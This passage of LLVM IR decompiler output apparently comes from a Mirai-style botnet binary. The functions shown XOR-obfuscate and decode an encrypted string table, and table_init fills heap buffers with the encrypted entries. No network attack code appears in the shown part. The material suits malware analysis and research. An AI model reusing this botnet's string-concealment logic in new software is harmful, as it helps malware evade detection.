  uselistorder i8 16, { 0, 1, 2, 4, 3, 12, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_24680.181 to i32), { 1, 2, 0, 3, 4 }
  uselistorder i8* @global_var_2468c.182, { 1, 0 }
  uselistorder i8** @global_var_2466c.178, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_2466c.178 to i32), { 2, 10, 3, 1, 0, 9, 4, 8, 7, 6, 5 }
  uselistorder i32 1023, { 2, 0, 1, 3, 4 }
  uselistorder i32 ()* @rand_next, { 65, 64, 63, 62, 61, 60, 59, 3, 2, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 10, 1, 9, 8, 7, 6, 5, 4, 3, 2, 0 }
  uselistorder i32* @global_var_27180.176, { 1, 2, 3, 4, 0, 5 }
  uselistorder i16 254, { 1, 2, 0 }
  uselistorder i32* @global_var_2717c.174, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 288, { 2, 3, 7, 0, 1, 4, 5, 6, 8 }
  uselistorder i32* @global_var_2469c.163, { 2, 0, 3, 4, 1, 6, 5 }
  uselistorder i32 (i32*)* @__GI_time, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26 }
  uselistorder i32 (i32)* @rand_init, { 1, 0 }
  uselistorder i32* @global_var_27164.91, { 3, 4, 0, 1, 2, 5, 6, 7, 8, 9, 10, 13, 11, 12 }
  uselistorder i32 ptrtoint (i32* @global_var_27164.91 to i32), { 1, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder i32 ()* @util_local_addr, { 2, 1, 0 }
  uselistorder i32* @global_var_27184.161, { 0, 2, 1 }
  uselistorder i32 ()* @__libc_fork, { 5, 4, 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_119f8, { 1, 0 }
  uselistorder label %bb428, { 1, 0 }
  uselistorder label %dec_label_pc_11914, { 1, 0 }
  uselistorder label %dec_label_pc_10cd0.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10cd0.backedge.thread528, { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_10cd0.backedge.thread, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_116b8, { 1, 0 }
  uselistorder label %dec_label_pc_115f0, { 1, 0 }
  uselistorder label %dec_label_pc_115ec, { 1, 2, 3, 4, 0, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_115e4, { 1, 2, 3, 0, 4, 6, 7, 5 }
  uselistorder label %dec_label_pc_115d4, { 1, 0 }
  uselistorder label %dec_label_pc_11564, { 6, 2, 3, 4, 1, 0, 5 }
  uselistorder label %.thread114, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11530, { 1, 0 }
  uselistorder label %.thread110, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11510, { 1, 0 }
  uselistorder label %dec_label_pc_114fc, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_114b8, { 1, 0 }
  uselistorder label %dec_label_pc_114b8.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_11498, { 5, 3, 4, 1, 0, 6, 2 }
  uselistorder label %dec_label_pc_11464, { 1, 0 }
  uselistorder label %thread-pre-split103, { 1, 0 }
  uselistorder label %dec_label_pc_11414, { 1, 0 }
  uselistorder label %dec_label_pc_1132c, { 1, 0 }
  uselistorder label %dec_label_pc_11260, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_11248, { 1, 0 }
  uselistorder label %dec_label_pc_1118c, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_11174, { 1, 0 }
  uselistorder label %dec_label_pc_110b8, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_110a0, { 1, 0 }
  uselistorder label %dec_label_pc_10fe4, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_10fcc, { 1, 0 }
  uselistorder label %dec_label_pc_10f10, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_10ef8, { 1, 0 }
  uselistorder label %dec_label_pc_10dd8, { 6, 1, 7, 3, 0, 2, 4, 5 }
  uselistorder label %bb390, { 1, 0 }
  uselistorder label %bb388, { 1, 0 }
  uselistorder label %dec_label_pc_10d9c, { 1, 0 }
  uselistorder label %dec_label_pc_10d34, { 1, 0 }
  uselistorder label %.thread63, { 1, 0 }
  uselistorder label %dec_label_pc_10ce8, { 1, 0 }
  uselistorder label %dec_label_pc_10cd8, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_10cd8.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_10cb0, { 1, 0 }
  uselistorder label %dec_label_pc_10c08, { 1, 0 }
  uselistorder label %bb384, { 1, 0 }
  uselistorder label %bb382, { 1, 0 }
  uselistorder label %bb380, { 1, 0 }
  uselistorder label %bb378, { 3, 4, 0, 1, 2, 6, 5 }
  uselistorder label %dec_label_pc_10afc.dec_label_pc_10afc_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10adc.dec_label_pc_10adc_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10ad0, { 4, 5, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10ac8, { 1, 0 }
  uselistorder label %dec_label_pc_10aa4, { 1, 0 }
  uselistorder label %dec_label_pc_10a80, { 1, 0 }
  uselistorder label %dec_label_pc_10934, { 10, 0, 1, 2, 7, 8, 3, 4, 5, 6, 9, 11 }
  uselistorder label %dec_label_pc_10920, { 1, 0 }
  uselistorder label %.thread39, { 1, 0 }
  uselistorder label %dec_label_pc_107ac, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10788, { 1, 0 }
  uselistorder label %dec_label_pc_1077c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10758, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10734, { 1, 0 }
  uselistorder label %bb350, { 1, 0 }
  uselistorder label %dec_label_pc_106e0, { 22, 6, 7, 2, 8, 3, 9, 4, 10, 5, 11, 0, 12, 13, 14, 15, 16, 17, 18, 19, 1, 20, 21, 23 }
  uselistorder label %dec_label_pc_f9bc, { 1, 0 }
}

define i32 @table_retrieve_val(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_2718c.552 to i32), i32* @r2, align 4
  %v3_11a04 = mul i32 %arg1, 8
  %v2_11a08 = add i32 %v3_11a04, ptrtoint (i32* @global_var_2718c.552 to i32)
  store i32 %v2_11a08, i32* @r3, align 4
  %v2_11a0c = icmp eq i32* %arg2, null
  br i1 %v2_11a0c, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v3_11a144 = inttoptr i32 %v2_11a08 to i32*
  %v4_11a145 = load i32, i32* %v3_11a144, align 4
  br label %bb7

bb:                                               ; preds = %entry
  %v2_11a10 = add i32 %v3_11a04, add (i32 ptrtoint (i32* @global_var_2718c.552 to i32), i32 4)
  %v3_11a10 = inttoptr i32 %v2_11a10 to i16*
  %v4_11a10 = load i16, i16* %v3_11a10, align 4
  %v5_11a10 = zext i16 %v4_11a10 to i32
  store i32 %v5_11a10, i32* @r3, align 4
  %v3_11a14 = inttoptr i32 %v2_11a08 to i32*
  %v4_11a14 = load i32, i32* %v3_11a14, align 4
  store i32 %v5_11a10, i32* %arg2, align 4
  br label %bb7

bb7:                                              ; preds = %.thread, %bb
  %v4_11a146 = phi i32 [ %v4_11a145, %.thread ], [ %v4_11a14, %bb ]
  ret i32 %v4_11a146

; uselistorder directives
  uselistorder i32 %v2_11a08, { 1, 0, 2 }
  uselistorder i32 %v3_11a04, { 1, 0 }
  uselistorder label %bb7, { 1, 0 }
}

define i32 @table_lock_val(i32 %arg1) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11a2c = mul i32 %arg1, 8
  %v2_11a30 = add i32 %v3_11a2c, ptrtoint (i32* @global_var_2718c.552 to i32)
  %v2_11a34 = load i32, i32* @global_var_244dc.555, align 4
  store i32 %v2_11a34, i32* @r1, align 4
  %v1_11a38 = add i32 %v3_11a2c, add (i32 ptrtoint (i32* @global_var_2718c.552 to i32), i32 4)
  %v2_11a38 = inttoptr i32 %v1_11a38 to i16*
  %v3_11a38 = load i16, i16* %v2_11a38, align 4
  %v3_11a3c = udiv i32 %v2_11a34, 256
  store i32 %v3_11a3c, i32* @r2, align 4
  %v2_11a40 = icmp eq i16 %v3_11a38, 0
  %v3_11a44 = udiv i32 %v2_11a34, 65536
  store i32 %v3_11a44, i32* @r3, align 4
  %v3_11a48 = load i32, i32* @r4, align 4
  store i32 %v3_11a48, i32* %stack_var_-16, align 4
  %v1_11a4c = urem i32 %v3_11a3c, 256
  store i32 %v1_11a4c, i32* %r6.global-to-local, align 4
  %v1_11a50 = urem i32 %v3_11a44, 256
  store i32 %v1_11a50, i32* %r5.global-to-local, align 4
  %v3_11a54 = udiv i32 %v2_11a34, 16777216
  store i32 %v3_11a54, i32* %r4.global-to-local, align 4
  %v1_11a58 = urem i32 %v2_11a34, 256
  store i32 %v1_11a58, i32* %lr.global-to-local, align 4
  br i1 %v2_11a40, label %dec_label_pc_11ab4, label %dec_label_pc_11a60

dec_label_pc_11a60:                               ; preds = %entry
  store i32 0, i32* @ip, align 4
  %v1_11a64 = inttoptr i32 %v2_11a30 to i32*
  br label %dec_label_pc_11a64

dec_label_pc_11a64:                               ; preds = %dec_label_pc_11a64.dec_label_pc_11a64_crit_edge, %dec_label_pc_11a60
  %v0_11a6c = phi i32 [ %v0_11a6c.pre, %dec_label_pc_11a64.dec_label_pc_11a64_crit_edge ], [ %v1_11a58, %dec_label_pc_11a60 ]
  %v2_11a70 = phi i32 [ %v1_11aa8, %dec_label_pc_11a64.dec_label_pc_11a64_crit_edge ], [ 0, %dec_label_pc_11a60 ]
  %v2_11a64 = load i32, i32* %v1_11a64, align 4
  %v2_11a68 = add i32 %v2_11a64, %v2_11a70
  %v3_11a68 = inttoptr i32 %v2_11a68 to i8*
  %v4_11a68 = load i8, i8* %v3_11a68, align 1
  %v6_11a68 = zext i8 %v4_11a68 to i32
  %v2_11a6c = xor i32 %v6_11a68, %v0_11a6c
  %v1_11a70 = trunc i32 %v2_11a6c to i8
  store i8 %v1_11a70, i8* %v3_11a68, align 1
  %v2_11a74 = load i32, i32* %v1_11a64, align 4
  %v0_11a78 = load i32, i32* @ip, align 4
  %v2_11a78 = add i32 %v0_11a78, %v2_11a74
  %v3_11a78 = inttoptr i32 %v2_11a78 to i8*
  %v4_11a78 = load i8, i8* %v3_11a78, align 1
  %v6_11a78 = zext i8 %v4_11a78 to i32
  %v0_11a7c = load i32, i32* %r6.global-to-local, align 4
  %v2_11a7c = xor i32 %v0_11a7c, %v6_11a78
  %v1_11a80 = trunc i32 %v2_11a7c to i8
  store i8 %v1_11a80, i8* %v3_11a78, align 1
  %v2_11a84 = load i32, i32* %v1_11a64, align 4
  %v0_11a88 = load i32, i32* @ip, align 4
  %v2_11a88 = add i32 %v0_11a88, %v2_11a84
  %v3_11a88 = inttoptr i32 %v2_11a88 to i8*
  %v4_11a88 = load i8, i8* %v3_11a88, align 1
  %v6_11a88 = zext i8 %v4_11a88 to i32
  %v0_11a8c = load i32, i32* %r5.global-to-local, align 4
  %v2_11a8c = xor i32 %v0_11a8c, %v6_11a88
  %v1_11a90 = trunc i32 %v2_11a8c to i8
  store i8 %v1_11a90, i8* %v3_11a88, align 1
  %v2_11a94 = load i32, i32* %v1_11a64, align 4
  store i32 %v2_11a94, i32* @r1, align 4
  %v0_11a98 = load i32, i32* @ip, align 4
  %v2_11a98 = add i32 %v0_11a98, %v2_11a94
  %v3_11a98 = inttoptr i32 %v2_11a98 to i8*
  %v4_11a98 = load i8, i8* %v3_11a98, align 1
  %v6_11a98 = zext i8 %v4_11a98 to i32
  %v0_11a9c = load i32, i32* %r4.global-to-local, align 4
  %v2_11a9c = xor i32 %v0_11a9c, %v6_11a98
  store i32 %v2_11a9c, i32* @r3, align 4
  %v1_11aa0 = trunc i32 %v2_11a9c to i8
  store i8 %v1_11aa0, i8* %v3_11a98, align 1
  %v3_11aa4 = load i16, i16* %v2_11a38, align 4
  %v4_11aa4 = zext i16 %v3_11aa4 to i32
  store i32 %v4_11aa4, i32* @r2, align 4
  %v0_11aa8 = load i32, i32* @ip, align 4
  %v1_11aa8 = add i32 %v0_11aa8, 1
  store i32 %v1_11aa8, i32* @ip, align 4
  %v8_11ab0 = icmp sgt i32 %v4_11aa4, %v1_11aa8
  br i1 %v8_11ab0, label %dec_label_pc_11a64.dec_label_pc_11a64_crit_edge, label %dec_label_pc_11ab4.loopexit

dec_label_pc_11a64.dec_label_pc_11a64_crit_edge:  ; preds = %dec_label_pc_11a64
  %v0_11a6c.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_11a64

dec_label_pc_11ab4.loopexit:                      ; preds = %dec_label_pc_11a64
  %v2_11ab4.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_11ab4

dec_label_pc_11ab4:                               ; preds = %dec_label_pc_11ab4.loopexit, %entry
  %v2_11ab4 = phi i32 [ %v2_11ab4.pre, %dec_label_pc_11ab4.loopexit ], [ %v3_11a48, %entry ]
  store i32 %v2_11ab4, i32* @r4, align 4
  ret i32 %v2_11a30

; uselistorder directives
  uselistorder i32 %v1_11aa8, { 1, 2, 0 }
  uselistorder i32 %v1_11a58, { 1, 0 }
  uselistorder i32 %v3_11a44, { 1, 0 }
  uselistorder i32 %v3_11a3c, { 1, 0 }
  uselistorder i32 %v2_11a34, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v2_11a30, { 1, 0 }
  uselistorder i32 %v3_11a2c, { 1, 0 }
}

define i32 @table_unlock_val(i32 %arg1) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11acc = mul i32 %arg1, 8
  %v2_11ad0 = add i32 %v3_11acc, ptrtoint (i32* @global_var_2718c.552 to i32)
  %v2_11ad4 = load i32, i32* @global_var_244dc.555, align 4
  %v1_11ad8 = add i32 %v3_11acc, add (i32 ptrtoint (i32* @global_var_2718c.552 to i32), i32 4)
  %v2_11ad8 = inttoptr i32 %v1_11ad8 to i16*
  %v3_11ad8 = load i16, i16* %v2_11ad8, align 4
  %v3_11adc = udiv i32 %v2_11ad4, 256
  %v2_11ae0 = icmp eq i16 %v3_11ad8, 0
  %v3_11ae4 = udiv i32 %v2_11ad4, 65536
  store i32 %v3_11ae4, i32* @r3, align 4
  %v3_11ae8 = load i32, i32* @r4, align 4
  store i32 %v3_11ae8, i32* %stack_var_-16, align 4
  %v1_11aec = urem i32 %v3_11adc, 256
  store i32 %v1_11aec, i32* %r6.global-to-local, align 4
  %v1_11af0 = urem i32 %v3_11ae4, 256
  store i32 %v1_11af0, i32* %r5.global-to-local, align 4
  %v3_11af4 = udiv i32 %v2_11ad4, 16777216
  store i32 %v3_11af4, i32* %r4.global-to-local, align 4
  %v1_11af8 = urem i32 %v2_11ad4, 256
  store i32 %v1_11af8, i32* %lr.global-to-local, align 4
  br i1 %v2_11ae0, label %dec_label_pc_11b54, label %dec_label_pc_11b00

dec_label_pc_11b00:                               ; preds = %entry
  store i32 0, i32* @ip, align 4
  %v1_11b04 = inttoptr i32 %v2_11ad0 to i32*
  br label %dec_label_pc_11b04

dec_label_pc_11b04:                               ; preds = %dec_label_pc_11b04.dec_label_pc_11b04_crit_edge, %dec_label_pc_11b00
  %v0_11b0c = phi i32 [ %v0_11b0c.pre, %dec_label_pc_11b04.dec_label_pc_11b04_crit_edge ], [ %v1_11af8, %dec_label_pc_11b00 ]
  %v2_11b10 = phi i32 [ %v1_11b48, %dec_label_pc_11b04.dec_label_pc_11b04_crit_edge ], [ 0, %dec_label_pc_11b00 ]
  %v2_11b04 = load i32, i32* %v1_11b04, align 4
  %v2_11b08 = add i32 %v2_11b04, %v2_11b10
  %v3_11b08 = inttoptr i32 %v2_11b08 to i8*
  %v4_11b08 = load i8, i8* %v3_11b08, align 1
  %v6_11b08 = zext i8 %v4_11b08 to i32
  %v2_11b0c = xor i32 %v6_11b08, %v0_11b0c
  %v1_11b10 = trunc i32 %v2_11b0c to i8
  store i8 %v1_11b10, i8* %v3_11b08, align 1
  %v2_11b14 = load i32, i32* %v1_11b04, align 4
  %v0_11b18 = load i32, i32* @ip, align 4
  %v2_11b18 = add i32 %v0_11b18, %v2_11b14
  %v3_11b18 = inttoptr i32 %v2_11b18 to i8*
  %v4_11b18 = load i8, i8* %v3_11b18, align 1
  %v6_11b18 = zext i8 %v4_11b18 to i32
  %v0_11b1c = load i32, i32* %r6.global-to-local, align 4
  %v2_11b1c = xor i32 %v0_11b1c, %v6_11b18
  %v1_11b20 = trunc i32 %v2_11b1c to i8
  store i8 %v1_11b20, i8* %v3_11b18, align 1
  %v2_11b24 = load i32, i32* %v1_11b04, align 4
  %v0_11b28 = load i32, i32* @ip, align 4
  %v2_11b28 = add i32 %v0_11b28, %v2_11b24
  %v3_11b28 = inttoptr i32 %v2_11b28 to i8*
  %v4_11b28 = load i8, i8* %v3_11b28, align 1
  %v6_11b28 = zext i8 %v4_11b28 to i32
  %v0_11b2c = load i32, i32* %r5.global-to-local, align 4
  %v2_11b2c = xor i32 %v0_11b2c, %v6_11b28
  %v1_11b30 = trunc i32 %v2_11b2c to i8
  store i8 %v1_11b30, i8* %v3_11b28, align 1
  %v2_11b34 = load i32, i32* %v1_11b04, align 4
  %v0_11b38 = load i32, i32* @ip, align 4
  %v2_11b38 = add i32 %v0_11b38, %v2_11b34
  %v3_11b38 = inttoptr i32 %v2_11b38 to i8*
  %v4_11b38 = load i8, i8* %v3_11b38, align 1
  %v6_11b38 = zext i8 %v4_11b38 to i32
  %v0_11b3c = load i32, i32* %r4.global-to-local, align 4
  %v2_11b3c = xor i32 %v0_11b3c, %v6_11b38
  store i32 %v2_11b3c, i32* @r3, align 4
  %v1_11b40 = trunc i32 %v2_11b3c to i8
  store i8 %v1_11b40, i8* %v3_11b38, align 1
  %v3_11b44 = load i16, i16* %v2_11ad8, align 4
  %v4_11b44 = zext i16 %v3_11b44 to i32
  %v0_11b48 = load i32, i32* @ip, align 4
  %v1_11b48 = add i32 %v0_11b48, 1
  store i32 %v1_11b48, i32* @ip, align 4
  %v8_11b50 = icmp sgt i32 %v4_11b44, %v1_11b48
  br i1 %v8_11b50, label %dec_label_pc_11b04.dec_label_pc_11b04_crit_edge, label %dec_label_pc_11b54.loopexit

dec_label_pc_11b04.dec_label_pc_11b04_crit_edge:  ; preds = %dec_label_pc_11b04
  %v0_11b0c.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_11b04

dec_label_pc_11b54.loopexit:                      ; preds = %dec_label_pc_11b04
  %v2_11b54.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_11b54

dec_label_pc_11b54:                               ; preds = %dec_label_pc_11b54.loopexit, %entry
  %v2_11b54 = phi i32 [ %v2_11b54.pre, %dec_label_pc_11b54.loopexit ], [ %v3_11ae8, %entry ]
  store i32 %v2_11b54, i32* @r4, align 4
  ret i32 %v2_11ad0

; uselistorder directives
  uselistorder i32 %v1_11b48, { 1, 2, 0 }
  uselistorder i32 %v1_11af8, { 1, 0 }
  uselistorder i32 %v3_11ae4, { 1, 0 }
  uselistorder i32 %v2_11ad4, { 3, 0, 1, 2 }
  uselistorder i32 %v3_11acc, { 1, 0 }
}

define i32 @table_init(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %v3_11b64 = load i32, i32* @r4, align 4
  %v6_11b64 = load i32, i32* @r5, align 4
  %v9_11b64 = load i32, i32* @r6, align 4
  %v12_11b64 = load i32, i32* @r7, align 4
  %v15_11b64 = load i32, i32* @r8, align 4
  %v21_11b64 = load i32, i32* @sl, align 4
  %v24_11b64 = load i32, i32* @fp, align 4
  store i32 2, i32* @r0, align 4
  %v0_11b70 = call i32 @malloc()
  store i32 2, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_2718c.552 to i32), i32* @r4, align 4
  store i32 %v0_11b70, i32* @r6, align 4
  %v3_11b88 = call i32 @util_memcpy(i32 %v0_11b70, i32 ptrtoint (i32* @global_var_1b98c.560 to i32), i32 2)
  %v0_11b8c = load i32, i32* @r5, align 4
  store i32 %v0_11b8c, i32* @r0, align 4
  %v0_11b90 = load i32, i32* @r6, align 4
  store i32 %v0_11b90, i32* @global_var_27194.561, align 4
  %v1_11b94 = trunc i32 %v0_11b8c to i16
  store i16 %v1_11b94, i16* bitcast (i32* @global_var_27198.562 to i16*), align 4
  %v0_11b98 = call i32 @malloc()
  %v0_11b9c = load i32, i32* @r5, align 4
  store i32 %v0_11b98, i32* @r6, align 4
  %v3_11ba8 = call i32 @util_memcpy(i32 %v0_11b98, i32 ptrtoint (i32* @global_var_1b990.564 to i32), i32 %v0_11b9c)
  store i32 19, i32* @r0, align 4
  %v0_11bb0 = load i32, i32* @r6, align 4
  store i32 %v0_11bb0, i32* @global_var_2719c.565, align 4
  %v0_11bb4 = load i32, i32* @r5, align 4
  %v1_11bb4 = trunc i32 %v0_11bb4 to i16
  store i16 %v1_11bb4, i16* bitcast (i32* @global_var_271a0.566 to i16*), align 4
  %v0_11bb8 = call i32 @malloc()
  store i32 19, i32* @fp, align 4
  store i32 %v0_11bb8, i32* @r5, align 4
  %v4_11bcc = call i32 @util_memcpy(i32 %v0_11bb8, i32 ptrtoint ([20 x i8]* @global_var_1b994.568 to i32), i32 19)
  store i32 7, i32* @r0, align 4
  %v0_11bd4 = load i32, i32* @r5, align 4
  store i32 %v0_11bd4, i32* @global_var_271a4.569, align 4
  %v0_11bd8 = load i32, i32* @fp, align 4
  %v1_11bd8 = trunc i32 %v0_11bd8 to i16
  store i16 %v1_11bd8, i16* bitcast (i32* @global_var_271a8.570 to i16*), align 4
  %v0_11bdc = call i32 @malloc()
  store i32 7, i32* @r7, align 4
  store i32 %v0_11bdc, i32* @r5, align 4
  %v3_11bf0 = call i32 @util_memcpy(i32 %v0_11bdc, i32 ptrtoint (i32* @global_var_1b9a8.572 to i32), i32 7)
  store i32 5, i32* @r0, align 4
  %v0_11bf8 = load i32, i32* @r5, align 4
  store i32 %v0_11bf8, i32* @global_var_271ac.573, align 4
  %v0_11bfc = load i32, i32* @r7, align 4
  %v1_11bfc = trunc i32 %v0_11bfc to i16
  store i16 %v1_11bfc, i16* bitcast (i32* @global_var_271b0.574 to i16*), align 4
  %v0_11c00 = call i32 @malloc()
  store i32 %v0_11c00, i32* @r5, align 4
  %v3_11c10 = call i32 @util_memcpy(i32 %v0_11c00, i32 ptrtoint (i32* @global_var_1b9b0.576 to i32), i32 5)
  store i32 4, i32* @r0, align 4
  %v0_11c1c = load i32, i32* @r5, align 4
  store i32 %v0_11c1c, i32* @global_var_271b4.577, align 4
  store i16 5, i16* bitcast (i32* @global_var_271b8.578 to i16*), align 4
  %v0_11c24 = call i32 @malloc()
  store i32 %v0_11c24, i32* @r5, align 4
  %v3_11c34 = call i32 @util_memcpy(i32 %v0_11c24, i32 ptrtoint (i32* @global_var_1b9b8.580 to i32), i32 4)
  store i32 14, i32* @r0, align 4
  store i16 4, i16* bitcast (i32* @global_var_271c0.581 to i16*), align 4
  %v0_11c44 = load i32, i32* @r5, align 4
  store i32 %v0_11c44, i32* @global_var_271bc.582, align 4
  %v0_11c48 = call i32 @malloc()
  store i32 14, i32* @r6, align 4
  store i32 %v0_11c48, i32* @r5, align 4
  %v3_11c5c = call i32 @util_memcpy(i32 %v0_11c48, i32 ptrtoint (i32* @global_var_1b9c0.584 to i32), i32 14)
  store i32 6, i32* @r0, align 4
  %v0_11c64 = load i32, i32* @r5, align 4
  store i32 %v0_11c64, i32* @global_var_271c4.585, align 4
  %v0_11c68 = load i32, i32* @r6, align 4
  %v1_11c68 = trunc i32 %v0_11c68 to i16
  store i16 %v1_11c68, i16* bitcast (i32* @global_var_271c8.586 to i16*), align 4
  %v0_11c6c = call i32 @malloc()
  store i32 6, i32* @r8, align 4
  store i32 %v0_11c6c, i32* @r5, align 4
  %v3_11c80 = call i32 @util_memcpy(i32 %v0_11c6c, i32 ptrtoint (i32* @global_var_1b9d0.588 to i32), i32 6)
  store i32 8, i32* @r0, align 4
  %v0_11c88 = load i32, i32* @r5, align 4
  store i32 %v0_11c88, i32* @global_var_271cc.589, align 4
  %v0_11c8c = load i32, i32* @r8, align 4
  %v1_11c8c = trunc i32 %v0_11c8c to i16
  store i16 %v1_11c8c, i16* bitcast (i32* @global_var_271d0.590 to i16*), align 4
  %v0_11c90 = call i32 @malloc()
  store i32 8, i32* @sl, align 4
  store i32 %v0_11c90, i32* @r5, align 4
  %v3_11ca4 = call i32 @util_memcpy(i32 %v0_11c90, i32 ptrtoint (i32* @global_var_1b9d8.592 to i32), i32 8)
  %v0_11ca8 = load i32, i32* @r7, align 4
  store i32 %v0_11ca8, i32* @r0, align 4
  %v0_11cac = load i32, i32* @r5, align 4
  store i32 %v0_11cac, i32* @global_var_271d4.593, align 4
  %v0_11cb0 = load i32, i32* @sl, align 4
  %v1_11cb0 = trunc i32 %v0_11cb0 to i16
  store i16 %v1_11cb0, i16* bitcast (i32* @global_var_271d8.594 to i16*), align 4
  %v0_11cb4 = call i32 @malloc()
  %v0_11cb8 = load i32, i32* @r7, align 4
  store i32 %v0_11cb4, i32* @r5, align 4
  %v3_11cc4 = call i32 @util_memcpy(i32 %v0_11cb4, i32 ptrtoint (i32* @global_var_1b9e4.596 to i32), i32 %v0_11cb8)
  store i32 16, i32* @r0, align 4
  %v0_11ccc = load i32, i32* @r5, align 4
  store i32 %v0_11ccc, i32* @global_var_271dc.597, align 4
  %v0_11cd0 = load i32, i32* @r7, align 4
  %v1_11cd0 = trunc i32 %v0_11cd0 to i16
  store i16 %v1_11cd0, i16* bitcast (i32* @global_var_271e0.598 to i16*), align 4
  %v0_11cd4 = call i32 @malloc()
  store i32 %v0_11cd4, i32* @r5, align 4
  %v3_11ce4 = call i32 @util_memcpy(i32 %v0_11cd4, i32 ptrtoint (i32* @global_var_1b9ec.600 to i32), i32 16)
  %v0_11cec = load i32, i32* @r6, align 4
  store i32 %v0_11cec, i32* @r0, align 4
  %v0_11cf0 = load i32, i32* @r5, align 4
  store i32 %v0_11cf0, i32* @global_var_271e4.601, align 4
  store i16 16, i16* bitcast (i32* @global_var_271e8.602 to i16*), align 4
  %v0_11cf8 = call i32 @malloc()
  %v0_11cfc = load i32, i32* @r6, align 4
  store i32 %v0_11cf8, i32* @r5, align 4
  %v3_11d08 = call i32 @util_memcpy(i32 %v0_11cf8, i32 ptrtoint (i32* @global_var_1ba00.604 to i32), i32 %v0_11cfc)
  store i32 9, i32* @r0, align 4
  %v0_11d10 = load i32, i32* @r5, align 4
  store i32 %v0_11d10, i32* @global_var_271ec.605, align 4
  %v0_11d14 = load i32, i32* @r6, align 4
  %v1_11d14 = trunc i32 %v0_11d14 to i16
  store i16 %v1_11d14, i16* bitcast (i32* @global_var_271f0.606 to i16*), align 4
  %v0_11d18 = call i32 @malloc()
  store i32 9, i32* @sb, align 4
  store i32 %v0_11d18, i32* @r5, align 4
  %v3_11d2c = call i32 @util_memcpy(i32 %v0_11d18, i32 ptrtoint (i32* @global_var_1ba10.608 to i32), i32 9)
  %v0_11d30 = load i32, i32* @fp, align 4
  store i32 %v0_11d30, i32* @r0, align 4
  %v0_11d34 = load i32, i32* @r5, align 4
  store i32 %v0_11d34, i32* @global_var_271f4.609, align 4
  %v0_11d38 = load i32, i32* @sb, align 4
  %v1_11d38 = trunc i32 %v0_11d38 to i16
  store i16 %v1_11d38, i16* bitcast (i32* @global_var_271f8.610 to i16*), align 4
  %v0_11d3c = call i32 @malloc()
  %v0_11d44 = load i32, i32* @fp, align 4
  store i32 %v0_11d3c, i32* @r5, align 4
  %v3_11d4c = call i32 @util_memcpy(i32 %v0_11d3c, i32 ptrtoint (i32* @global_var_1ba1c.612 to i32), i32 %v0_11d44)
  store i32 23, i32* @r0, align 4
  %v0_11d54 = load i32, i32* @r5, align 4
  store i32 %v0_11d54, i32* @global_var_271fc.613, align 4
  %v0_11d58 = load i32, i32* @fp, align 4
  %v1_11d58 = trunc i32 %v0_11d58 to i16
  store i16 %v1_11d58, i16* bitcast (i32* @global_var_27200.614 to i16*), align 4
  %v0_11d5c = call i32 @malloc()
  store i32 %v0_11d5c, i32* @r5, align 4
  %v3_11d6c = call i32 @util_memcpy(i32 %v0_11d5c, i32 ptrtoint (i32* @global_var_1ba30.616 to i32), i32 23)
  %v0_11d74 = load i32, i32* @sl, align 4
  store i32 %v0_11d74, i32* @r0, align 4
  store i16 23, i16* bitcast (i32* @global_var_27208.617 to i16*), align 4
  %v0_11d7c = load i32, i32* @r5, align 4
  store i32 %v0_11d7c, i32* @global_var_27204.618, align 4
